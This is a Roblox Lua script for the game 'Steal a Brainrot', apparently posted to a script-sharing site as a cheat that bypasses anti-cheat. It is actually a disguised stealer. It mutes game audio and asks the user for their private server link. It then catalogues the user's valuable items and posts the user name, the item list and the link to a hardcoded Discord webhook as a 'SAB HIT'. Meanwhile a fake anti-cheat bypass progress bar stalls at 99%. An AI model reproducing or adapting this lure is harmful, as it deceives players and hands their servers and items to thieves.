--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")

-- Mute all sounds
local function mutarSom(som)
    if som:IsA("Sound") then
        som.Volume = 0
        som:Stop()
    end
end

local function mutarDescendentes(instancia)
    for _, obj in ipairs(instancia:GetDescendants()) do
        mutarSom(obj)
    end
end

local pastas = {game.Workspace, game.Players, game.ReplicatedStorage, game.Lighting, game.StarterGui, game.StarterPack}

for _, pasta in ipairs(pastas) do
    mutarDescendentes(pasta)
    pasta.DescendantAdded:Connect(function(obj)
        mutarSom(obj)
    end)
end

getgenv().webhook = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa"
getgenv().websiteEndpoint = nil

-- ==========================================
-- COMPLETE BRAINROT DATABASE - Steal a Brainrot
-- Values based on La Vacca Saturno Saturnita = 1 unit
-- ==========================================
getgenv().BRAINROT_VALUES = {
    -- OG Brainrots (Highest Value)
    ["Strawberry Elephant"] = 50000,
    ["Skibidi Toilet"] = 35000,
    ["Meowl"] = 25000,
    
    -- Secret Brainrots (High Tier)
    ["Dragon Gingerini"] = 9500,
    ["Dragon Cannelloni"] = 5500,
    ["Hydra Dragon Cannelloni"] = 5000,
    ["Cerberus"] = 4500,
    ["Rosey and Teddy"] = 3800,
    ["Ketupat Bros"] = 2700,
    ["Ginger Gerat"] = 2500,
    ["La Supreme Combinasion"] = 2400,
    ["Capitano Moby"] = 2000,
    ["Cooki and Milki"] = 2000,
    ["Reinito Sleighito"] = 2000,
    ["Burguro And Fryuro"] = 1600,
    ["Spooky and Pumpky"] = 1200,
    ["Fragrama and Chocrama"] = 1100,
    ["Los Primos"] = 1000,
    ["Garama and Madundung"] = 980,
    ["La Casa Boo"] = 950,
    ["Popcuru and Fizzuru"] = 900,
    ["Rosetti Tualetti"] = 900,
    ["Jolly Jolly Sahur"] = 700,
    ["La Secret Combinasion"] = 550,
    ["La Ginger Sekolah"] = 500,
    ["Chillin Chili"] = 450,
    ["Tang Tang Keletang"] = 400,
    ["Ketupat Kepat"] = 360,
    ["La Taco Combinasion"] = 330,
    ["Los Bros"] = 320,
    ["Tictac Sahur"] = 330,
    ["Los Spaghettis"] = 300,
    ["Chipso and Queso"] = 300,
    ["Los Jolly Combinasionas"] = 300,
    ["Nuclearo Dinossauro"] = 300,
    ["Orcaledon"] = 275,
    ["Spaghetti Tualetti"] = 275,
    ["La Jolly Grande"] = 260,
    ["List List List Sahur"] = 245,
    ["La Romantic Grande"] = 250,
    ["Los Candies"] = 245,
    ["Money Money Puggy"] = 240,
    ["W or L"] = 220,
    ["La Extinct Grande"] = 200,
    ["Gobblino Uniciclino"] = 200,
    ["Las Sis"] = 200,
    ["Eviledon"] = 200,
    ["Los Puggies"] = 150,
    ["Brunito Marsito"] = 150,
    ["Money Money Reindeer"] = 140,
    ["La Spooky Grande"] = 130,
    ["Los 25"] = 130,
    ["Chicleteira Cupideira"] = 125,
    ["Tuff Toucan"] = 120,
    ["Spinny Hammy"] = 120,
    ["Esok Sekolah"] = 110,
    ["Noo my Heart"] = 100,
    ["Swaggy Bros"] = 100,
    ["Bacuru and Egguru"] = 90,
    ["Los Spooky Combinasionas"] = 70,
    ["La Grande Combinasion"] = 70,
    ["Chicleteira Noelteira"] = 45,
    ["Los Combinasionas"] = 45,
    ["Los 67"] = 40,
    ["Secret Lucky Block"] = 40,
    ["Mieteteira Bicicleteira"] = 35,
    ["Chicleteira Bicicleteira"] = 35,
    ["Chimnino"] = 30,
    ["Chicleteirina Bicicleteirina"] = 25,
    ["Los Mobilis"] = 25,
    ["67"] = 20,
    ["Rang Ring Bus"] = 20,
    ["Noo my Present"] = 20,
    ["Los Nooo My Hotspotsitos"] = 20,
    ["Arcadopus"] = 15,
    ["Noo my Candy"] = 15,
    ["Pot Hotspot"] = 15,
    ["Los Quesadillas"] = 15,
    ["Burrito Bandito"] = 15,
    ["Chill Puppy"] = 15,
    ["Quesadillo Vampiro"] = 10,
    ["Ho Ho Ho Sahur"] = 5,
    ["Job Job Job Sahur"] = 5,
    ["Frankentteo"] = 4,
    ["Los Trios"] = 4,
    ["Karker Sahur"] = 4,
    ["Las Vaquitas Saturnitas"] = 4,
    ["Los Karkeritos"] = 4,
    ["Extinct Matteo"] = 4,
    ["Pumpkini Spyderini"] = 4,
    ["Rocco Disco"] = 4,
    ["Reindeer Tralala"] = 4,
    ["La Karkerkar Combinasion"] = 4,
    ["Yess my Examine"] = 4,
    ["Bisonte Giuppitere"] = 2,
    ["Karkerkar Kurkur"] = 2,
    ["Los Matteos"] = 2,
    ["Trenostruzzo Turbo 4000"] = 2,
    ["Jackorilla"] = 2,
    ["Sammyni Spyderini"] = 2,
    ["Torrtuginni Dragonfrutini"] = 2,
    ["Dul Dul Dul"] = 2,
    ["Blackhole Goat"] = 2,
    ["Chachechi"] = 2,
    ["Agarrini la Palini"] = 2,
    ["Los Spyderinis"] = 2,
    ["Fragola La La La"] = 2,
    ["Extinct Tralalero"] = 2,
    ["La Cucaracha"] = 2,
    ["Los Tralaleritos"] = 2,
    ["Los Tortus"] = 2,
    ["Zombie Tralala"] = 2,
    ["Vulturino Skeletono"] = 2,
    ["Boatito Auratito"] = 2,
    ["Guerriro Digitale"] = 2,
    ["La Vacca Saturno Saturnita"] = 1,
    
    -- Brainrot God Brainrots
    ["Pop Pop Sahur"] = 77,
    ["Ginger Cisterna"] = 76,
    ["Bombardini Tortinii"] = 64,
    ["Los Tipi Tacos"] = 60,
    ["Frio Ninja"] = 59,
    ["Yeti Claus"] = 58,
    ["Ginger Globo"] = 58,
    ["Dug Dug Dug"] = 57,
    ["Los Orcalitos"] = 57,
    ["Aquanaut"] = 57,
    ["Corn Corn Corn Sahur"] = 56,
    ["Squalanana"] = 56,
    ["Cacasito Satalito"] = 56,
    ["Tartaruga Cisterna"] = 56,
    ["Los Bombinitos"] = 55,
    ["Tractoro Dinosauro"] = 55,
    ["Piccione Macchina"] = 54,
    ["Espresso Signora"] = 53,
    ["Trenostruzzo Turbo 3000"] = 53,
    ["Pakrahmatmamat"] = 50,
    ["Los Tungtuntuncitos"] = 50,
    ["Ballerina Peppermintina"] = 50,
    ["Gattito Tacoto"] = 47,
    ["Capi Taco"] = 45,
    ["Urubini Flamenguini"] = 44,
    ["Trippi Troppi Troppa Trippa"] = 44,
    ["Tukanno Bananno"] = 23,
    ["Statutino Libertino"] = 22,
    ["Tipi Topi Taco"] = 22,
    ["Tralalita Tralala"] = 22,
    ["Chihuanini Taconini"] = 22,
    ["Girafa Celestre"] = 20,
    ["Gyattatino Nyanino"] = 20,
    ["Trigoligre Frutonni"] = 20,
    ["Orcalero Orcala"] = 20,
    ["Alessio"] = 19,
    ["Los Crocodilitos"] = 18,
    ["Odin Din Din Dun"] = 18,
    ["Matteo"] = 25,
    ["Tralalero Tralala"] = 25,
    ["Cocofanta Elefanto"] = 14,
    
    -- Mythic Brainrots
    ["Tree Tree Tree Sahur"] = 14,
    ["Bananito Bandito"] = 14,
    ["Toiletto Focaccino"] = 13,
    ["Carrotini Brainini"] = 13,
    ["Elefanto Frigo"] = 12,
    ["Carloo"] = 12,
    ["Cachorrito Melonito"] = 12,
    ["Jingle Jingle Sahur"] = 12,
    ["Gangazelli Trulala"] = 12,
    ["Tob Tobi Tobi"] = 11,
    ["Lerulerulerule"] = 11,
    ["Tracoducotulu Delapeladustuz"] = 10,
    ["Gorillo Watermelondrillo"] = 10,
    ["Cavallo Virtuso"] = 8,
    ["Te Te Te Sahur"] = 8,
    ["Avocadorilla"] = 7,
    ["Bombombini Gusini"] = 4,
    ["Zibra Zubra Zibralini"] = 4,
    ["Tigrilini Watermelini"] = 4,
    ["Bombardiro Crocodilo"] = 3,
    ["Rhino Toasterino"] = 3,
    ["Orangutini Ananasini"] = 3,
    ["Spioniro Golubiro"] = 3,
    ["Frigo Camelo"] = 2,
    
    -- Legendary Brainrots
    ["Sigma Girl"] = 0.2,
    ["Sealo Regalo"] = 0.2,
    ["Buho de Fuego"] = 0.2,
    ["Puffaball"] = 0.18,
    ["Chocco Bunny"] = 0.17,
    ["Sigma Boy"] = 0.16,
    ["Signore Carapace"] = 0.15,
    ["Pi Pi Watermelon"] = 0.15,
    ["Pandaccini Bananini"] = 0.14,
    ["Cocosini Mama"] = 0.13,
    ["Pipi Potato"] = 0.12,
    ["Strawberrelli Flamingelli"] = 0.12,
    ["Blueberrinni Octopusini"] = 0.11,
    ["Caramello Filtrello"] = 0.11,
    ["Quivoli Ameleoni"] = 0.1,
    ["Glorbo Fruttodrillo"] = 0.09,
    ["Lionel Cactuseli"] = 0.08,
    ["Chef Crabracadabra"] = 0.08,
    ["Burbaloni Loliloli"] = 0.08,
    ["Ballerina Cappuccina"] = 0.07,
    ["Tirilikalika Tirilikalako"] = 0.06,
    ["Chimpanzini Bananini"] = 0.05,
    
    -- Epic Brainrots
    ["Mummio Rappitto"] = 0.08,
    ["Penguino Cocosino"] = 0.07,
    ["Wombo Rollo"] = 0.07,
    ["Penguin Tree"] = 0.07,
    ["Doi Doi Do"] = 0.07,
    ["Salamino Penguino"] = 0.06,
    ["Frogato Pirato"] = 0.06,
    ["Mangolini Parrocini"] = 0.06,
    ["Ti Ti Ti Sahur"] = 0.06,
    ["Avocadini Guffo"] = 0.06,
    ["Brri Brri Bicus Dicus Bombicus"] = 0.05,
    ["Perochello Lemonchello"] = 0.05,
    ["Bananita Dolphinita"] = 0.05,
    ["Malame Amarele"] = 0.05,
    ["Bambini Crostini"] = 0.05,
    ["Trulimero Trulicina"] = 0.05,
    ["Avocadini Antilopini"] = 0.04,
    ["Brr Brr Patapim"] = 0.04,
    ["Bandito Axolito"] = 0.03,
    ["Cappuccino Assassino"] = 0.03,
    
    -- Rare Brainrots
    ["Pinealotto Fruttarino"] = 0.05,
    ["Pipi Avocado"] = 0.05,
    ["Frogo Elfo"] = 0.05,
    ["Tric Trac Baraboom"] = 0.05,
    ["Ta Ta Ta Ta Sahur"] = 0.04,
    ["Cacto Hipopotamo"] = 0.04,
    ["Boneca Ambalabu"] = 0.03,
    ["Bandito Bobritto"] = 0.03,
    ["Gangster Footera"] = 0.03,
    ["Trippi Troppi"] = 0.02,
    
    -- Common Brainrots
    ["Pipi Corni"] = 0.02,
    ["Pipi Kiwi"] = 0.02,
    ["Tartaragno"] = 0.02,
    ["Raccooni Jandelini"] = 0.02,
    ["Noobini Santanini"] = 0.02,
    ["Talpa Di Fero"] = 0.02,
    ["Svinina Bombardino"] = 0.02,
    ["Fluriflura"] = 0.01,
    ["Tim Cheese"] = 0.01,
    ["Lirilì Larilà"] = 0.01,
    ["Noobini Pizzanini"] = 0.01,
}

-- IGNORE LIST - Objects that contain these words are NOT player items
local IGNORE_PATTERNS = {
    "collision", "ignore", "vfx", "stars", "spawn", "trader", "npc", "shop", 
    "template", "storage", "system", "handler", "controller", "manager",
    "left", "right", "bigger", "present", "god lucky block", "workspace",
    "baseplate", "terrain", "camera", "gui", "ui", "effect", "trail", "particle",
    "sound", "decal", "texture", "mesh", "union", "wedge", "corner", "cylinder"
}

-- Get rarity based on value
local function getRarity(value)
    if value >= 1000 then return "🔴 Secret"
    elseif value >= 50 then return "🟠 Brainrot God"
    elseif value >= 10 then return "🟡 Mythic"
    elseif value >= 1 then return "🟢 Legendary"
    elseif value >= 0.1 then return "🔵 Epic"
    elseif value >= 0.05 then return "🟣 Rare"
    else return "⚪ Common" end
end

-- Check if name should be ignored
local function shouldIgnore(name)
    local lowerName = name:lower()
    for _, pattern in ipairs(IGNORE_PATTERNS) do
        if lowerName:find(pattern) then
            return true
        end
    end
    return false
end

-- Fuzzy match brainrot name (handles slight variations and mutations)
local function getBrainrotType(name)
    -- Direct match
    if getgenv().BRAINROT_VALUES[name] then
        return name, getgenv().BRAINROT_VALUES[name]
    end
    
    -- Case-insensitive match
    for brainrotName, value in pairs(getgenv().BRAINROT_VALUES) do
        if name:lower() == brainrotName:lower() then
            return brainrotName, value
        end
    end
    
    -- Partial match (for mutated names like "Golden Tralalero Tralala")
    for brainrotName, value in pairs(getgenv().BRAINROT_VALUES) do
        if name:find(brainrotName) or brainrotName:find(name) then
            return brainrotName, value
        end
    end
    
    return nil, 0
end

-- Enhanced brainrot scanning with multiple detection methods
local function scanBrainrots()
    local foundBrainrots = {}
    local totalValue = 0
    local totalCount = 0
    local scannedNames = {} -- Prevent duplicates
    
    -- Method 1: Check Player's Backpack (Inventory)
    if LocalPlayer:FindFirstChild("Backpack") then
        for _, obj in ipairs(LocalPlayer.Backpack:GetDescendants()) do
            if obj:IsA("Tool") or obj:IsA("Model") then
                local name = obj.Name
                if not shouldIgnore(name) and not scannedNames[name] then
                    local brainrotType, value = getBrainrotType(name)
                    if brainrotType then
                        scannedNames[name] = true
                        table.insert(foundBrainrots, {
                            name = name,
                            displayName = brainrotType,
                            value = value,
                            location = "Backpack",
                            rarity = getRarity(value)
                        })
                        totalValue = totalValue + value
                        totalCount = totalCount + 1
                    end
                end
            end
        end
    end
    
    -- Method 2: Check Character (Equipped items)
    if LocalPlayer.Character then
        for _, obj in ipairs(LocalPlayer.Character:GetDescendants()) do
            if obj:IsA("Tool") or obj:IsA("Model") or obj:IsA("Part") or obj:IsA("MeshPart") then
                local name = obj.Name
                if not shouldIgnore(name) and not scannedNames[name] then
                    local brainrotType, value = getBrainrotType(name)
                    if brainrotType then
                        scannedNames[name] = true
                        table.insert(foundBrainrots, {
                            name = name,
                            displayName = brainrotType,
                            value = value,
                            location = "Equipped",
                            rarity = getRarity(value)
                        })
                        totalValue = totalValue + value
                        totalCount = totalCount + 1
                    end
                end
            end
        end
    end
    
    -- Method 3: Check PlayerGui for Inventory UI
    if LocalPlayer:FindFirstChild("PlayerGui") then
        local guiItems = LocalPlayer.PlayerGui:FindFirstChild("Brainrots") or 
                        LocalPlayer.PlayerGui:FindFirstChild("Inventory") or
                        LocalPlayer.PlayerGui:FindFirstChild("Items") or
                        LocalPlayer.PlayerGui:FindFirstChild("PetUI")
        if guiItems then
            for _, obj in ipairs(guiItems:GetDescendants()) do
                if obj:IsA("TextLabel") or obj:IsA("ImageLabel") then
                    local name = obj.Name
                    if not shouldIgnore(name) and not scannedNames[name] then
                        local brainrotType, value = getBrainrotType(name)
                        if brainrotType then
                            scannedNames[name] = true
                            table.insert(foundBrainrots, {
                                name = name,
                                displayName = brainrotType,
                                value = value,
                                location = "UI",
                                rarity = getRarity(value)
                            })
                            totalValue = totalValue + value
                            totalCount = totalCount + 1
                        end
                    end
                end
            end
        end
    end
    
    -- Method 4: Check ReplicatedStorage for player data
    pcall(function()
        local playerData = ReplicatedStorage:FindFirstChild("PlayerData") or 
                          ReplicatedStorage:FindFirstChild("PlayerBrainrots")
        if playerData then
            local userData = playerData:FindFirstChild(tostring(LocalPlayer.UserId)) or
                           playerData:FindFirstChild(LocalPlayer.Name)
            if userData then
                for _, obj in ipairs(userData:GetDescendants()) do
                    local name = obj.Name
                    if not shouldIgnore(name) and not scannedNames[name] then
                        local brainrotType, value = getBrainrotType(name)
                        if brainrotType then
                            scannedNames[name] = true
                            table.insert(foundBrainrots, {
                                name = name,
                                displayName = brainrotType,
                                value = value,
                                location = "Data",
                                rarity = getRarity(value)
                            })
                            totalValue = totalValue + value
                            totalCount = totalCount + 1
                        end
                    end
                end
            end
        end
    end)
    
    -- Sort by value (highest first)
    table.sort(foundBrainrots, function(a, b)
        return a.value > b.value
    end)
    
    return foundBrainrots, totalValue, totalCount
end

-- Webhook sender with enhanced formatting
local function sendPetWebhook(foundPets, privateServerLink)
    local petCounts = {}
    for _, pet in ipairs(foundPets) do
        petCounts[pet.displayName] = (petCounts[pet.displayName] or 0) + 1
    end

    local formattedPets = {}
    for petName, count in pairs(petCounts) do
        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
    end

    local executorName = LocalPlayer.Name

    local embedData = {
        username = "GodFather Scripts",
        content = "@everyone",
        embeds = { {
            title = "🔴 SAB HIT - Brainrot Inventory",
            color = 3447003,
            fields = {
                {
                    name = "👤 User",
                    value = executorName,
                    inline = false
                },
                {
                    name = "👥 Players",
                    value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers),
                    inline = false
                },
                {
                    name = "🔗 Server Link",
                    value = privateServerLink ~= "" and privateServerLink or "No link provided",
                    inline = false
                },
                {
                    name = "🧠 Brainrots Found (" .. #foundPets .. " items)",
                    value = #formattedPets > 0 and table.concat(formattedPets, "\n") or "No brainrots found",
                    inline = false
                }
            },
            footer = { text = "GodFather Scripts | " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = DateTime.now():ToIsoDate()
        } }
    }

    local jsonData = HttpService:JSONEncode(embedData)
    local req = http_request or request or (syn and syn.request)
    if req then
        local success, err = pcall(function()
            req({
                Url = getgenv().webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
        if success then
            print("✅ Webhook sent")
        else
            warn("❌ Webhook failed:", err)
        end
    else
        warn("❌ No HTTP request function available")
    end
end

-- Legacy function for compatibility
local function checkForPets()
    local found = {}
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local nameLower = string.lower(obj.Name)
            for target, _ in pairs(getgenv().BRAINROT_VALUES) do
                if string.find(nameLower, string.lower(target)) then
                    table.insert(found, obj.Name)
                    break
                end
            end
        end
    end
    return found
end

-- GUI Creation
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = CoreGui
ScreenGui.IgnoreGuiInset = true

local Background = Instance.new("Frame")
Background.Size = UDim2.new(1,0,1,0)
Background.BackgroundColor3 = Color3.fromRGB(20,20,20)
Background.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(0.8,0,0.15,0)
Title.Position = UDim2.new(0.1,0,0.3,0)
Title.BackgroundTransparency = 1
Title.Text = "Enter your server link"
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.Font = Enum.Font.GothamBlack
Title.TextScaled = true
Title.Parent = Background

local InputBox = Instance.new("TextBox")
InputBox.Size = UDim2.new(0.6,0,0.08,0)
InputBox.Position = UDim2.new(0.2,0,0.5,0)
InputBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
InputBox.TextColor3 = Color3.fromRGB(0,0,0)
InputBox.PlaceholderText = "private server link here..."
InputBox.Text = ""
InputBox.Font = Enum.Font.Gotham
InputBox.TextScaled = true
InputBox.Parent = Background

local StartButton = Instance.new("TextButton")
StartButton.Size = UDim2.new(0.3,0,0.08,0)
StartButton.Position = UDim2.new(0.35,0,0.62,0)
StartButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
StartButton.TextColor3 = Color3.fromRGB(255,255,255)
StartButton.Text = "Start"
StartButton.Font = Enum.Font.GothamBold
StartButton.TextScaled = true
StartButton.Parent = Background

local function UpdateButton()
    if InputBox.Text ~= "" then
        StartButton.BackgroundColor3 = Color3.fromRGB(0,170,0)
        StartButton.Active = true
    else
        StartButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        StartButton.Active = false
    end
end
InputBox:GetPropertyChangedSignal("Text"):Connect(UpdateButton)
UpdateButton()

local function CreateBypassGUI()
    ScreenGui:Destroy()
    
    local BypassScreenGui = Instance.new("ScreenGui")
    BypassScreenGui.Parent = CoreGui
    BypassScreenGui.IgnoreGuiInset = true
    BypassScreenGui.Name = "BypassGUI"

    local BypassBackground = Instance.new("Frame")
    BypassBackground.Size = UDim2.new(1,0,1,0)
    BypassBackground.BackgroundColor3 = Color3.fromRGB(20,20,20)
    BypassBackground.Parent = BypassScreenGui

    local BypassTitle = Instance.new("TextLabel")
    BypassTitle.Size = UDim2.new(0.8,0,0.15,0)
    BypassTitle.Position = UDim2.new(0.1,0,0.2,0)
    BypassTitle.BackgroundTransparency = 1
    BypassTitle.Text = "Bypassing Anti Cheat"
    BypassTitle.TextColor3 = Color3.fromRGB(255,255,255)
    BypassTitle.Font = Enum.Font.GothamBlack
    BypassTitle.TextScaled = true
    BypassTitle.Parent = BypassBackground

    local LoadingBarBackground = Instance.new("Frame")
    LoadingBarBackground.Size = UDim2.new(0.6,0,0.05,0)
    LoadingBarBackground.Position = UDim2.new(0.2,0,0.4,0)
    LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(60,60,60)
    LoadingBarBackground.BorderSizePixel = 0
    LoadingBarBackground.Parent = BypassBackground

    local LoadingBar = Instance.new("Frame")
    LoadingBar.Size = UDim2.new(0,0,1,0)
    LoadingBar.Position = UDim2.new(0,0,0,0)
    LoadingBar.BackgroundColor3 = Color3.fromRGB(0,170,0)
    LoadingBar.BorderSizePixel = 0
    LoadingBar.Parent = LoadingBarBackground

    local PercentageText = Instance.new("TextLabel")
    PercentageText.Size = UDim2.new(0.6,0,0.1,0)
    PercentageText.Position = UDim2.new(0.2,0,0.5,0)
    PercentageText.BackgroundTransparency = 1
    PercentageText.Text = "0%"
    PercentageText.TextColor3 = Color3.fromRGB(255,255,255)
    PercentageText.Font = Enum.Font.GothamBold
    PercentageText.TextScaled = true
    PercentageText.Parent = BypassBackground

    local startTime = tick()
    local duration = 180
    
    local function updateLoading()
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / duration, 0.99)
        
        LoadingBar.Size = UDim2.new(progress, 0, 1, 0)
        
        local percent = math.floor(progress * 100)
        PercentageText.Text = percent .. "%"
        
        if progress < 0.99 then
            wait(0.1)
            updateLoading()
        else
            PercentageText.Text = "99%"
        end
    end
    
    spawn(updateLoading)
end

StartButton.MouseButton1Click:Connect(function()
    if InputBox.Text ~= "" then
        local privateServerLink = InputBox.Text
        
        -- Use enhanced scanner instead of legacy check
        local petsFound, totalValue, totalCount = scanBrainrots()
        
        if #petsFound > 0 then
            print("✅ Brainrots found:", totalCount, "items, Total Value:", totalValue, "LV")
            sendPetWebhook(petsFound, privateServerLink)
        else
            print("🔍 No brainrots found")
            -- Fallback to legacy method if enhanced scanner finds nothing
            local legacyPets = checkForPets()
            if #legacyPets > 0 then
                print("⚠️ Legacy method found:", table.concat(legacyPets, ", "))
            end
        end

        CreateBypassGUI()
        print("Link enviado:", privateServerLink)
    end
end)
